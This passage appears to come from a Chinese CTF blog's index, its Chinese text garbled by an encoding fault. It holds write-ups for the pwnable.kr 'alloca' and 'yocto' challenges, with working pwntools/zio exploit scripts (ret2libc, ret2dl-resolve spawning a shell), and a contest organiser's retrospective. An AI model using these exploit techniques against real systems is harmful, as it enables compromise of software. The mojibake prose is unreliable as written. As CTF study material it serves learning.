´ä»–çš„é˜²æŠ¤ï¼Œæ‹¿åˆ°shellã€‚çœ‹ä¸‹binæ–‡ä»¶å¼€äº†ä»€ä¹ˆä¿æŠ¤ï¼šè°ƒè¯•å‘ç°ï¼Œcheck_canary()å‡½æ•°è¿”å›çš„æ—¶å€™ï¼Œå¦‚æœæ°å½“çš„è®¾ç½®g_canaryçš„å€¼ï¼Œå°±å¯ä»¥æ§åˆ¶è¿”å›åœ°å€¼ã€‚ç„¶åæˆ‘å°±å¡åœ¨è¿™é‡Œäº†â€¦å¼€å¯äº†NXï¼Œåªèƒ½ROPçš„æ€è·¯æï¼Œä½†æ˜¯ROPé“¾åˆä¸çŸ¥é“å“ªé‡Œæ”¾ç½®ã€‚ 0x02:åæ¥å‚è€ƒäº†åˆ«äººçš„åšæ³•ï¼Œæ‰å‘ç°è¿™æ˜¯ä¸ªæœ¬åœ°åˆ©ç”¨â€¦ç›´æ¥æŒ‰ç…§ä»¥å‰ç©overthewireå­¦æ¥çš„å¥—è·¯å°±å¯ä»¥ï¼šscæ”¾åœ¨ç¯å¢ƒå˜é‡ç¦»ï¼Œç„¶åç¡®å®šåœ°å€ï¼Œç›´æ¥æ”¹è¿”å›åœ°å€¼è¿‡å»å°±å¯ä»¥äº†ã€‚ä¸è¿‡é¦–å…ˆè¦åˆ©ç”¨ulimit -s unlimitedå»å›ºå®šä¸‹libcçš„åŠ è½½åœ°å€ï¼Œç„¶åæ‰å¯ä»¥ç¡®å®šsystem()å’Œ/bin/shåœ°å€ã€‚ é™„ä¸Šæˆ‘æœ¬åœ°è°ƒè¯•çš„æ—¶å€™çš„expï¼Œç¯å¢ƒä¸åŒï¼Œæ‰€ä»¥åœ°å€å¯èƒ½ä¸åŒã€‚ 123456789101112131415161718192021from pwn import *import osoff_system = 0x0003d3e0 # objdump -d /lib/i386-linux-gnu/libc.so.6 | grep systemoff_shell = 0x0015ea69 # grep -oba /bin/sh /lib/i386-linux-gnu/libc.so.6adr_libc = 0x40047000 # ldd allocaadr_payload = 0x40025857 # searchmem \"AAAA\"payload = p32(adr_libc + off_system)payload += p32(0xdeadbeef)payload += p32(adr_libc + off_shell)#test = \"AAAABBBBCCCC\"#p = process('./alloca', env = {'LD_PRELOAD': test})p = process('./alloca', env = {'LD_PRELOAD': payload})#raw_input(\"$$\")p.sendline(str(-92))p.sendline(str((adr_payload + 4) ^ 0x08048250))p.interactive()'''0x40025857 ^ 0x08048250 --&gt; 0x4806da07Cannot access memory at address 0x4806da030x40025857 + 4''' 0x03:å‚è€ƒé“¾æ¥0byjwzsf","link":"/2016/08/14/pwnable-kr-alloca/"},{"title":"pwnhubæ¯CUITç¬¬åä¸‰å±Šæ ¡èµ›pwnå‡ºé¢˜åŠè¿ç»´å¿ƒå¾—","text":"0x00: å‰è¨€â€‹ è¿™æ¬¡åº”è¯¥æ˜¯æˆ‘å‚ä¸çš„ç¬¬ä¸‰æ¬¡æ ¡èµ›äº†ï¼Œç¬¬ä¸€æ¬¡å¤§ä¸€çš„æ—¶å€™æ˜¯å‚èµ›è€…ï¼Œå’ŒæŸ æª¬ã€K1n9è¿˜æœ‰ç®¡ç†å°å§å§ç»„é˜Ÿï¼›åé¢ä¸¤æ¬¡éƒ½æ˜¯ä»¥å‡ºé¢˜è€…èº«ä»½å‚ä¸ï¼Œåœ¨å‡ºé¢˜ä¸­å­¦ä¹ åˆ°äº†å¾ˆå¤šã€‚ç¬¬ä¸€æ¬¡å‡ºé¢˜çš„æ—¶å€™å¤ªnaiveâ€¦ä¹Ÿæ²¡å‚ä¸è¿ç»´ï¼Œéƒ½æ˜¯å­¦é•¿åœ¨åšé…ç½®ã€ç»´æŠ¤ï¼Œè¿™æ¬¡è‡ªå·±ä¸Šé˜µï¼Œè™½ç„¶å‡†å¤‡äº†ä¸å°‘ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰å¾ˆå¤šé—®é¢˜æš´éœ²å‡ºæ¥ã€‚ â€‹ è¿™æ¬¡æ–‡ç« æ¶‰åŠå‡ºé¢˜å¿ƒå¾—ï¼Œå‡ºé¢˜ä¸­çš„ä¸€äº›æ€è€ƒã€åæ€ï¼›è¿ç»´ä¸­çš„ä¸€äº›é—®é¢˜ï¼Œä»¥åŠå¯¹é—®é¢˜çš„è§£å†³å’Œä»¥åçš„é¢„é˜²æ–¹æ¡ˆã€‚ 0x01:å‡ºé¢˜å¿ƒå¾—1. pwn50 python jailâ€‹ è¿™æ˜¯ä¸€ä¸ªpython jailï¼Œé¢˜ç›®æ˜¯æ ¹æ®ä¸€ä¸ªä»¥å‰çš„ctfæ”¹çš„ï¼Œæˆ‘è¿‡æ»¤äº†ä¸€äº›å‡½æ•°ã€å­—ç¬¦ï¼Œç†Ÿæ‚‰ä¸€ç‚¹pythonçš„åŒå­¦å°±èƒ½å®¹æ˜“ç»•è¿‡ï¼Œä½¿ç”¨getattrå»åšå‡½æ•°è°ƒç”¨ã€‚ç®—æ˜¯ä¸€ä¸ªé€åˆ†é¢˜å§ 233333ã€‚ 2. pwn100 lemon waterâ€‹ æœ¬æ¥pwn100æ˜¯å­¦å¼Ÿçš„â€¦åé¢å‡ºäº†ç‚¹é—®é¢˜ï¼Œä»–ç”©é”…äº†TATã€‚ æˆ‘å°±æƒ³ç€éšä¾¿å‡ºä¸€ä¸ªå§ï¼Œå°±æ”¾äº†è¿™ä¹ˆä¸€ä¸ªformat stringçš„ç›²æ‰“ã€‚ â€‹ è¿™ç§é¢˜ç›®çš„æ€è·¯ä¹Ÿå¾ˆç®€å•ï¼Œå…ˆç”¨%pï¼Œç¡®å®šarchï¼Œç„¶åå†ç¡®å®šè¾“å…¥åœ¨stackçš„ä½ç½®ï¼Œè¿™æ¬¡è¿™ä¸ªé¢˜ç›®æ˜¯%6$ï¼Œåé¢çš„å°±å¾ˆç®€å•äº†ï¼Œdumpå‡ºæ¥bin fileï¼Œç„¶åç¡®å®šgotè¡¨ï¼Œæœ‰äº†fmtè¿™ç§ä»»æ„åœ°å€è¯»çš„ï¼Œæ„é€ leakå°±å¯ä»¥æ‹¿systemåœ°å€äº†ï¼Œåé¢ç›´æ¥hijacking printf gotï¼Œè¾“å…¥ä¸€ä¸ª/bin/shï¼Œå°±æ‹¿shellå•¦~ â€‹ ä½†æ˜¯è¿™ç§é¢˜ç›®ä»¥åæœ€å¥½ä¸è¦å‡ºï¼Œä¸€æ˜¯æ²¡ä»€ä¹ˆæ„æ€ï¼ŒäºŒæ˜¯å¯¹æœåŠ¡å™¨çš„èµ„æºæ¶ˆè€—å¾ˆä¸¥é‡ï¼Œå¾ˆå®¹æ˜“ggã€‚è¿™æ˜¯è‡ªå·±çš„é—®é¢˜ï¼ŒèƒŒé”…èƒŒé”…â€¦è¿™ä¸ªé¢˜ç›®å‡ºçš„ä¸å¥½TAT ä¸è¿‡é¡ºæ‰‹é»‘äº†ä¸€æ³¢lemonåŒå­¦ 233333 3. pwn200 file shareâ€‹ å…ˆè¯´ä¸‹è¿™ä¸ªé¢˜ç›®çš„æƒ³æ³•å§ã€‚å¼€å§‹æ˜¯åŸºå‹byg0neå†™çš„ä¸€ä¸ªfile shareï¼Œæˆ‘æ‹¿æ¥ä¿®æ”¹çš„ï¼Œä»–é‚£ä¸ªç¨‹åºæ˜¯è§£æhttpçš„ï¼Œæœ‰ç‚¹ç±»ä¼¼serverä¸Šè¿è¡Œä¸€ä¸ªpython -m EasyHTTPServer è¿™ç§ï¼Œwgetå»è·å–æ–‡ä»¶ã€‚ â€‹ å¯¹äºè¿™æ ·çš„ä¸€ä¸ªç¨‹åºæ€ä¹ˆå¡è¿›å»ä¸¤ä¸ªæ´å‘¢ï¼Ÿæˆ‘é¦–å…ˆæƒ³åˆ°ngnixé‚£ä¸ªBROPï¼Œè§£æhttpçš„æ—¶å€™æ ˆæº¢å‡ºï¼Œå—¯â€¦æˆ‘å¯ä»¥å†™è¿›å»ä¸€ä¸ªloginåŠŸèƒ½ï¼Œç„¶åæœ‰è¿™ä¸ªæ¼æ´ã€‚å¦å¤–éœ€è¦ä¸€ä¸ªæ³„éœ²ï¼Œæ€ä¹ˆåšå‘¢ï¼Ÿä¹‹å‰çœ‹äº†é•¿äº­æ¨åšå£«çš„ä¸‰ä¸ªæ¼æ´æå®šè·¯ç”±å™¨ï¼Œæåˆ°äº†snprintfçš„æ»¥ç”¨å¯¼è‡´heap info leakï¼Œæˆ‘ä¹ŸåŠ äº†è¿›å»ã€‚æ‰€ä»¥åŸæœ¬çš„é¢˜ç›®æ˜¯è¿™æ ·çš„â€¦ä½†æ˜¯åæ¥æµ‹è¯•çš„æ—¶å€™å‘ç°ï¼Œä¿¡æ¯æ³„éœ²å¯ä»¥æ­£å¸¸ç©ï¼Œæ³„éœ²äº†å †ä¿¡æ¯ï¼Œç„¶åæ ¹æ®offset å’Œä¸€äº›æ³„éœ²å‡ºæ¥çš„ä¿¡æ¯ï¼Œèƒ½ç¡®å®šlibc base addrï¼Œæä¾›libc.soï¼Œå°±èƒ½æ‹¿åˆ°éœ€è¦çš„ä¿¡æ¯äº†ã€‚ä½†æ˜¯é—®é¢˜å‡ºåœ¨æ ˆæº¢å‡ºéƒ¨åˆ†ï¼Œæƒ³å¢åŠ ä¸€ä¸ªcrack canaryï¼Œç„¶åå†è®©ä»–dupæ”¹æ ‡å‡†è¾“å…¥è¾“å‡ºï¼Œç„¶åROPæ‹¿shellâ€¦æ­»åœ¨crack canaryäº†ï¼Œä¸€äº›ä¸å¯æ˜¾å­—ç¬¦æ¥æ”¶æœ‰é—®é¢˜-ã€‚- å°±ggäº† â€‹ deadlineé€¼è¿‘ï¼Œæˆ‘å°±æ”¹äº†é¢˜ç›®â€¦ä¸€ä¸‹å­æ”¹ç®€å•äº†ï¼Œæˆ‘èƒŒé”…â€¦è¿˜é€ æˆå¤šè§£æƒ…å†µã€‚ â€‹ ä¿®æ”¹åé¢˜ç›®çš„åŸæœ¬è®¾æƒ³ï¼šfmt æ³„éœ²ç¨‹åºåŠ è½½åœ°å€ï¼Œç¡®å®šget flagå‡½æ•°åœ°å€ï¼Œcrack canaryï¼Œç„¶åè¦†ç›–è¿”å›åœ°å€¼æ‹¿åˆ°flagã€‚ä½†æ˜¯socketè¿™ç§ï¼fork serverçš„å•Šï¼Œä¸é‡å¯åŠ è½½åœ°å€ä¸€æ ·çš„å•Šï¼Œå¯ä»¥æ— é™fmt leakçš„å•ŠTAT ç»“æœå°±æ˜¯â€¦ä¸€ä¸ªfmtå°±å¯ä»¥æ’¸äº†ã€‚ã€‚æ³„éœ²å®Œäº†ç›´æ¥fmt æ—¥è¿”å›åœ°å€¼ â€‹ è¿™ä¸ªé¢˜ç›®å¦‚æœæŒ‰ç…§åŸæœ¬æ€è·¯å¯èƒ½æ›´å¥½ä¸€ç‚¹ã€‚æˆ–è€…è¿™ä¸ªé¢˜ç›®å»æ‰get flagå‡½æ•°ï¼Œç»™libcï¼Œå¯ä»¥è®©æ³„éœ²å®Œäº†ä¹‹åé€šè¿‡offsetæ‹¿åˆ°dupï¼Œæ”¹æ ‡å‡†è¾“å…¥è¾“å‡ºï¼Œç„¶åROPæ‹¿shellã€‚ 4. pwn300 notebookâ€‹ å¸¸è§„çš„heapé¢˜ç›®ï¼Œå¾ˆç®€å•ã€‚å¡è¿›å»äº†å †æº¢å‡ºã€UAFã€é‡Šæ”¾åçš„heapæœªæ¸…ç©ºã€‚ â€‹ åˆ©ç”¨çš„è¯ï¼Œåˆ©ç”¨fastbinçš„å»leak infoï¼Œç„¶åå †æº¢å‡ºhijacking å‡½æ•°æŒ‡é’ˆï¼ŒUAF è°ƒç”¨é‡Šæ”¾åçš„å—ä¸­çš„æ–¹æ³•get shellã€‚å¾ˆå¸¸è§„çš„ä¸€é“é¢˜ç›®å§ï¼Œæ„Ÿè§‰ä¹Ÿæ²¡å•¥éš¾åº¦â€¦.å¸ˆå‚…ä»¬ç§’çš„è´¼å¿«ã€‚ 5. pwn400 &amp;&amp; pwn500ox9a82å­¦å¼Ÿçš„é¢˜ç›®ï¼Œå…³æ³¨ä»–çš„åšå®¢å°±å¥½å•¦~ä»–ä¼šå†™çš„å¾ˆè¯¦ç»†ã€‚ é¢˜ç›®å‡ºçš„å¾ˆæœ‰è´¨é‡ï¼Œheapç©å‡ºäº†èŠ±ï¼Œä½†æ˜¯ä»£ç é‡æŒºå¤§çš„ï¼Œå¯èƒ½æœ‰äº›åœ°æ–¹æ²¡æµ‹è¯•åˆ°ï¼Œå‡ºæ¼äº†ä¹Ÿæ˜¯æœ‰å¯èƒ½çš„ 23333 è†œä¸€å‘9a82å¤§ä½¬ XD 0x02:è¿ç»´ä¸è¿ç»´ä¸çŸ¥é“è¾›è‹¦å•Šâ€¦é…æœåŠ¡å™¨çš„æ—¶å€™è§‰å¾—è‡ªå·±ç®€ç›´æ˜¯ä¸ªæ™ºéšœä¸€æ ·ã€‚ é€‰æ‹©ä½¿ç”¨socatè¿˜æ˜¯xinetd çº ç»“å†ä¸‰ä½¿ç”¨äº†socatï¼Œå…¶å®éƒ½å·®ä¸å¤šï¼Œsocatæ›´ç®€å•ä¸€ç‚¹ã€‚ 1nohup socat TCP-LISTEN:50004,fork,reuseaddr EXEC:'/home/pwn400/pwn400' &gt; /dev/null 2&gt;&amp;1 &amp; å¤§æ¦‚è¿™æ ·çš„å§ï¼Œå…·ä½“çš„å…¶ä»–éœ€æ±‚å¯ä»¥çœ‹socatæ–‡æ¡£å»ä¿®æ”¹ã€‚ æƒé™é—®é¢˜ å•¥ä¹Ÿåˆ«è¯´äº†æ‰€æœ‰å†™æƒé™éƒ½banæ‰ï¼Œå‘½ä»¤ä¹Ÿåšå¥½æƒé™ï¼Œæœ€å¥½åªç•™ä¸‹ls cd catè¿™ä¸‰ä¸ªã€‚ è¿˜æœ‰å°±æ˜¯ï¼Œæˆ‘å¼€å§‹å¿˜è®°ç»™.bashrcå»æ‰wæƒé™äº†ï¼Œè¢«jokerå¸ˆå‚…å†™äº† 1echo :p ;exit 0 æˆ‘æœåŠ¡éƒ½æ²¡èµ·æ¥â€¦ä¸€è„¸æ‡µé€¼çš„é—®äº†ä»–ï¼Œåé¢æ”¹äº†æ”¹â€¦å¸ˆå‚…åˆç»™æˆ‘ä¸Šäº†ä¸€è¯¾TAT è¿˜æœ‰å°±æ˜¯pwn æœåŠ¡ç›¸å…³æ–‡ä»¶æœ€å¥½åŠ ä¸Šchattr +aä¸€ä¸‹â€¦ å…¶ä»– fork bombè¿™ä¸ªçœŸæ˜¯æ²¡æƒ³åˆ°â€¦ç»“æœè¢«jokerå¸ˆå‚…pwn50æ‰“è¿›æ¥ï¼Œfork bombæå´©äº†å¥½å‡ æ¬¡â€¦åé¢æ”¹äº†é…ç½®æ–‡ä»¶ï¼Œé™åˆ¶ç”¨æˆ·å¯çš„è¿›ç¨‹æ•°ç›®ï¼Œé‡å¯ä¹‹åå¥½äº†ä¸€ç‚¹ã€‚ä½†æ˜¯è¿™æ ·æœ‰ä¸ªé—®é¢˜å°±æ˜¯ï¼Œå½“socat å¯åŠ¨çš„è¿›ç¨‹åˆ°ä¸€å®šæ•°ç›®ä¹‹åï¼Œåˆ°äº†è®¾ç½®çš„maxå€¼ï¼Œå°±èµ·ä¸æ¥è¿›ç¨‹å•¦ï¼Œå°±è¦é‡å¯æœåŠ¡äº†ï¼Œå¾ˆéº»çƒ¦ã€‚æœ€å¥½çš„åŠæ³•æ˜¯ï¼Œé¢˜ç›®é‡Œéƒ½å†™ä¸Šalarmï¼Œä½†æ˜¯é—®é¢˜æ˜¯åƒpwn100é‚£ç§ï¼Œæ²¡æ³•è¿™ä¹ˆå¹²â€¦æ¯”è¾ƒå°´å°¬ï¼Œå†™ä¸ªcrontabè‡ªåŠ¨é‡å¯å¥½äº† æµé‡ æŠ“æµé‡å°±æ˜¯ä¸ºäº†åä½œå¼Šï¼Œäº‹å®è¯æ˜è¿™æ¬¡æŠ“æµé‡å¸®äº†å¤§å¿™ã€‚å‘µå‘µï¼Œ ç°åœ¨CTFé£æ°”è¿™æ ·ï¼Œæˆ‘èƒ½æ€ä¹ˆåŠï¼Œæˆ‘ä¹Ÿå¾ˆç»æœ›ï¼Œæˆ‘å°±æ˜¯è¦æ€¼ã€‚ éƒ¨ç½²äº†tcpdumpï¼Œå†™äº†crontabå»æŠ“æµé‡ï¼Œä»¥å°æ—¶ä¸ºå•ä½ã€‚ å½“ç„¶äº†ï¼Œè¿™ç§æ–¹æ¡ˆä¸æ˜¯å¾ˆå¥½ï¼Œè€Œä¸”è¿™æ¬¡é¢˜ç›®æ²¡tokenï¼Œå¯¼è‡´æˆ‘åé¢åˆ†ææµé‡ç±»æ­»äº†ï¼Œä¸€ä¸ªåŒ…ä¸€ä¸ªåŒ…çš„çœ‹ã€‚ä»¥åçš„è¯å¯ä»¥å‚è€ƒæ­ç”µexploreå¸ˆå‚…çš„é»‘åŸŸï¼Œæµé‡æŠ“çš„æ›´å…¨ï¼Œç›´æ¥å­˜æ•°æ®åº“é‡Œï¼Œæ–¹ä¾¿checkã€‚ è‡ªåŠ¨åŒ–å•Šè‡ªåŠ¨åŒ– ä¸€å®šè¦åšå¥½è‡ªåŠ¨åŒ–ï¼Œæ¯”å¦‚æœåŠ¡é‡å¯(æ¯”å¦‚é‚£ä¸ªpwn100)ï¼Œå†™crontabè‡ªåŠ¨é‡å¯ï¼Œè¦ä¸ç„¶å¥½ç´¯å•Šï¼Œè§‰éƒ½ç¡ä¸å¥½ã€‚ 0x03: éšä¾¿çbbCTFé£æ°”æ…¢æ…¢å˜å¾—å¾ˆå·®ï¼Œæ‹¿è¿™æ¬¡pwn50æˆ‘æŠ“åˆ°çš„æµé‡æ¥è¯´ï¼Œæœ‰è¿™å‡ ç§æƒ…å†µï¼š payload å‡ ä¹ä¸€æ ·çš„ æ²¡æœ‰ä»»ä½•å°è¯•ç›´æ¥ä½¿ç”¨å…³é”®å‡½æ•°å»å‘½ä»¤æ‰§è¡Œçš„ åªæ˜¯éšä¾¿äº¤äº’çš„ï¼Œä¸€ç‚¹æ„ä¹‰éƒ½æ²¡ï¼Œä½†æ˜¯é‚£ä¸ªipåˆæäº¤äº†flagï¼Œå¯èƒ½æ˜¯å­¦æ ¡åŸå› å§å‡ºå£ipä¸€æ ·ã€‚ é‚£äº›æäº¤æ—¶é—´é—´éš”ä¸åˆ°1minã€3minçš„ã€‚ çˆ±æ€ä¹ˆææ€ä¹ˆæå§ã€‚ æˆ‘ä¸æ‡‚ï¼Œé‚£æ˜¯ä¸ªpythonçš„jailå•Šï¼Œä½ ä¸å°è¯•æˆ‘è¿‡æ»¤äº†å“ªäº›å­—ç¬¦ï¼Œå“ªäº›å‡½æ•°ï¼Œæ€ä¹ˆç¡®å®šç”¨getattrçš„ï¼Ÿ å»ä¹°å½©ç¥¨å§åŒå­¦ï¼Œä¸­äº†å¤§å¥–è®°å¾—åˆ†æˆ‘ 233333 0x04: ç»“æŸè¯­â€‹ æ¯”èµ›è¿˜æ˜¯åŠçš„æ²¡å•¥å¤§çš„é—®é¢˜ï¼Œä¹Ÿå­¦åˆ°å¾ˆå¤šä¸œè¥¿ï¼ŒçŸ¥é“è‡ªå·±å¾ˆå¤šä¸è¶³ï¼Œä»¥åå¤šå­¦ä¹ ã€‚æ„Ÿè°¢å¸ˆå‚…ä»¬çš„æ”¯æŒã€åŒ…å®¹å’Œç†è§£ã€‚æ¯”èµ›æ—¶é—´æ¯”è¾ƒå°´å°¬ï¼Œå¯¹ä¸ä½å¤§å®¶äº†ï¼Œå¯¼è‡´å¾ˆå¤šå¸ˆå‚…æ²¡æ¥ç©ï¼Œæ¯”è¾ƒé—æ†¾ï¼Œæˆ‘ä»¬çš„é”…TAT â€‹ è¿˜æœ‰å°±æ˜¯é€šè¿‡æ¯”èµ›åˆè®¤è¯†äº†ä¸€æ³¢å¸ˆå‚…ï¼Œæ¯”å¦‚nonickè¿™ä½ï¼Œéå¸¸å¼ºä»¥åå¤šäº¤æµå­¦ä¹  -ã€‚- åˆå¯ä»¥è¿›æ­¥å•¦","link":"/2017/05/29/pwnhub%E6%9D%AFCUIT%E7%AC%AC%E5%8D%81%E4%B8%89%E5%B1%8A%E6%A0%A1%E8%B5%9Bpwn%E5%87%BA%E9%A2%98%E5%8F%8A%E8%BF%90%E7%BB%B4%E5%BF%83%E5%BE%97/"},{"title":"yocto writeup","text":"ä¹‹å‰å­¦ä¹ ret 2 dl-resolveçš„æ—¶å€™çš„è®°å½•ï¼Œç¬¬ä¸€æ¬¡é‡åˆ°è¿™ç§ç±»å‹çš„é¢˜ç›®åº”è¯¥æ˜¯jokerå¸ˆå‚…ç»™CCTFå‡ºçš„é¢˜ç›®ï¼Œä¹‹åå¸ˆå‚…ç»™äº†æˆ‘yoctoè¿™ä¸ªé¢˜ç›®ï¼Œå¹¶ç»™äº†æˆ‘ä»–çš„expï¼Œæˆ‘æ ¹æ®ä¸€äº›æ–‡ç« +å¸ˆå‚…çš„expæå®šäº†è¿™ä¸ªé¢˜ç›®çš„åˆ©ç”¨ã€‚ 0x00:åˆ†æç¨‹åºé€»è¾‘å¾ˆç®€å•ã€‚ 123456789101112Input: 1111.2222.3333.4444 ebp-0xc #12 edx 2222 ebp-0x10 #16 ecx 3333 ebp-0x14 #20 eax 1111then...call exc(edx,eax) 0000| 0xbffff9dc --&gt; 0x8ae # 2222 0004| 0xbffff9e0 --&gt; 0x457 # 1111 0008| 0xbffff9e4 --&gt; 0x80495c9 (&quot;.3333.4444\\n&quot;) 0012| 0xbffff9e8 --&gt; 0x457 0016| 0xbffff9ec --&gt; 0xd05 0020| 0xbffff9f0 --&gt; 0x8ae 0x01:åˆ©ç”¨æ€è·¯ä½¿ç”¨ret 2 dl-resloveæŠ€æœ¯ï¼Œä¼ªé€ relocå’Œdynsymå’Œdynstrï¼Œç„¶åæ§åˆ¶è¿”å›åœ°å€¼ä¸ºplt[0]å¹¶ä¸”è®¾ç½®å¥½å‚æ•°ï¼Œä½¿å¾—ç¨‹åºå»æŸ¥æ‰¾å¹¶è°ƒç”¨çš„æ˜¯system()å‡½æ•°ï¼Œå¹¶æ‰§è¡Œæˆ‘ä»¬è®¾ç½®çš„å‘½ä»¤ã€‚ 0x02:expæ„é€ è¿‡ç¨‹123456789101112131415161718192021222324252627282930313233343536373839404142#!/usr/bin/env python2__author__ = \"muhe\"from zio import *args = ['./yocto']io = zio(args, timeout=100000)plt_addr = 0x080482a0 # objdump -s -j .plt yoctorel_plt_addr = 0x08048270 # objdump -s -j .rel.plt yoctodynsym_addr = 0x0804818c # objdump -s -j .dynsym yoctodynstr_addr = 0x080481fc # objdump -s -j .dynstr yoctobase_addr = 0x080495C0 # globatoi_got_plt = 0x08049548atoi_plt = 0x080482e0# fake reloc herefake_reloc_addr = base_addr + 16reloc_offset = fake_reloc_addr - rel_plt_addr# fake dynsym here#fake_dynsym_addr = base_addr + ?# fake dynstr here'''input: 1111.2222.3333 push eax 1111 push edx 2222 jmp ecx 3333call ecx(edx,eax)'''payload = str(atoi_plt) #eaxpayload += '.'payload += str(reloc_offset) #edxpayload += '.'payload += str(plt_addr) #ecxio.writeline(payload)raw_input('waiting for debugger attach...')io.interact() checkæ²¡è¿‡ï¼Œç»§ç»­æ„é€ ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#!/usr/bin/env python2__author__ = \"muhe\"from zio import *args = ['./yocto']io = zio(args, timeout=100000)plt_addr = 0x080482a0 # objdump -s -j .plt yoctorel_plt_addr = 0x08048270 # objdump -s -j .rel.plt yoctodynsym_addr = 0x0804818c # objdump -s -j .dynsym yoctodynstr_addr = 0x080481fc # objdump -s -j .dynstr yoctobase_addr = 0x080495C0 # globatoi_got_plt = 0x08049548atoi_plt = 0x080482e0# fake reloc herefake_reloc_addr = base_addr + 36 # 0x80495e4reloc_offset = fake_reloc_addr - rel_plt_addr # 0x1374# fake dynsym herefake_dynsym_addr = base_addr + 60# const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];r_info = (fake_dynsym_addr - dynsym_addr) &lt;&lt; 8 | 0x7# fake dynstr herefake_dynstr_addr = bass_addr + 45 # 0x80495edst_name = fake_dynstr_addr - dynstr_addrbin_sh_addr = bass_addr + 76 # 0x804960c'''input: 1111.2222.3333 push eax 1111 push edx 2222 jmp ecx 3333call ecx(edx,eax)'''payload = str(atoi_plt) #eaxpayload += '.'payload += str(reloc_offset) #edxpayload += '.'payload += str(plt_addr) #ecxraw_input('waiting for debugger attach...')payload += \"AAAA\"payload += \"BBBB\"payload += \"CCCC\"payload += \"DDDD\"payload += \"EEEE\"payload += \"FFFF\"payload += \"GGGG\"payload += \"HHHH\"payload += \"IIII\"payload += \"JJJJ\"payload += \"KKKK\"payload += \"LLLL\"payload += \"MMMM\"payload += \"NNNN\"print len(payload)io.writeline(payload)io.interact() è¿‡äº† 1assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT); æœ€ä½ä½æ˜¯ä¸æ˜¯7çš„checkã€‚ å˜æ¢expç»§ç»­è°ƒè¯• 1234567891011121314151617181920212223242526272829....payload = str(atoi_plt) #eaxpayload += '.'payload += str(reloc_offset) #edxpayload += '.'payload += str(plt_addr) #ecx#raw_input('waiting for debugger attach...')io.gdb_hint([0x080483F5])payload += \"AAAA\"payload += \"BBBB\"payload += \"CCCC\"#payload += \"DDDD\"#payload += \"EEEE\" # r_infopayload += l32(atoi_got_plt)payload += l32(r_info)payload += \"FFFF\"payload += \"GGGG\"payload += \"HHHH\"payload += \"IIII\"payload += \"JJJJ\"payload += \"KKKK\"payload += \"LLLL\"payload += \"MMMM\"payload += \"NNNN\"print len(payload)io.writeline(payload)io.interact() å˜æ¢payloadéƒ¨åˆ† 12345678910111213141516171819202122232425262728payload = str(atoi_plt) #eaxpayload += '.'payload += str(reloc_offset) #edxpayload += '.'payload += str(plt_addr) #ecx#raw_input('waiting for debugger attach...')io.gdb_hint([0x080483F5])payload += \"AAAA\"payload += \"BBBB\"payload += \"CCCC\"#payload += \"DDDD\"#payload += \"EEEE\" # r_infopayload += l32(atoi_got_plt)payload += l32(r_info)payload += \"FFFF\"payload += \"GGGG\"payload += \"HHHH\"payload += \"IIII\"payload += \"JJJJ\" # fake_dynsym_addrpayload += \"KKKK\"payload += \"LLLL\"#payload += \"MMMM\"payload += l32(0)payload += \"NNNN\"print len(payload)io.writeline(payload)io.interact() è§£å†³åŠæ³•ï¼šæ­£å¸¸è°ƒè¯•è¿™ä¸ªè¿‡ç¨‹ï¼Œçœ‹çœ‹å¼•èµ·å¼‚å¸¸çš„éƒ¨åˆ†åœ¨å“ªé‡Œã€‚ st_nameè®¾ç½®çš„é—®é¢˜ï¼Œä¿®æ”¹æ­£ç¡®çš„ä½ç½®ï¼Œæ”¹å˜payloadä¸ºå¦‚ä¸‹ï¼Œç»§ç»­è°ƒè¯•ã€‚ 12345678910111213141516171819202122232425payload = str(atoi_plt) #eaxpayload += '.'payload += str(reloc_offset) #edxpayload += '.'payload += str(plt_addr) #ecx#raw_input('waiting for debugger attach...')io.gdb_hint([0x080483F5])payload += \"AAAA\"payload += \"BBBB\"payload += \"CCCC\"payload += l32(atoi_got_plt) #fake_relocpayload += l32(r_info)payload += \"FFFF\" # fake_dynstr_addrpayload += \"GGGG\"payload += \"HHHH\"payload += \"IIII\"payload += l32(st_name) # fake_dynsym_addrpayload += \"KKKK\"payload += \"LLLL\"payload += l32(0)payload += \"NNNN\"print len(payload)io.writeline(payload)io.interact() è¿™æ ·ä¿®æ”¹ä¹‹åå‘ç°:æ›¿æ¢systemè¿‡å»ï¼Œåº”è¯¥å°±å¯ä»¥æ‰¾åˆ°systemçš„åœ°å€äº†ã€‚ ç„¶è€Œâ€¦ä¸€å£è€è¡€è¦å–·å‡ºæ¥äº† è¿™æ˜¯ä¿®æ”¹ä¹‹åçš„payload 12345678910111213141516171819202122232425262728293031payload = str(atoi_plt) #eaxpayload += '.'payload += str(reloc_offset) #edxpayload += '.'payload += str(plt_addr) #ecx#raw_input('waiting for debugger attach...')io.gdb_hint([0x080483F5])payload += \"AAAA\"payload += \"\\x90\" * (36 - len(payload))print \"$1 --&gt; %d\" % (len(payload))payload += l32(atoi_got_plt) #fake_relocpayload += l32(r_info)payload += \"\\x90\"*(45 - len(payload)) # fake_dynstr_addr string: \"system\\x00\" herepayload += \"system\\x00\"print \"$2 --&gt; %d\" % (len(payload))payload += \"\\x90\" * (60 - len(payload))payload += l32(st_name) # fake_dynsym_addrpayload += l32(0)payload += l32(0)payload += l32(0x12)print \"$3 --&gt; %d\" % (len(payload))payload += \"\\x90\" * (80 - len(payload))io.writeline(payload)io.interact() å•æ­¥çœ‹çœ‹å‘ç”Ÿäº†ä»€ä¹ˆå§â€¦. å‡½æ•°çš„å‚æ•°å¦‚ä¸‹: 12_dl_lookup_symbol_x (undef_name=0x80495ed &lt;glob+45&gt; \"system\", undef_map=undef_map@entry=0xb7779938, ref=ref@entry=0xbff81f38, symbol_scope=0xb7779af0, version=0xb7753c98, type_class=type_class@entry=0x1, flags=flags@entry=0x1, skip_map=skip_map@entry=0x0) å¯¹æ¯”æºç é‡Œè¿™ä¸ªå‡½æ•°çš„åŸå‹: 12result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,4444 version, ELF_RTYPE_CLASS_PLT, flags, NULL); è¿”å›å€¼æ˜¯libcçš„åŸºåœ°å€ã€‚ å¯¹æ¯”äº†ä¸‹9kå¸ˆå‚…çš„expï¼Œåº”è¯¥æ˜¯dynsymçš„ä¼ªé€ å—æ²¡æœ‰åšå¯¹é½â€¦åŸå› 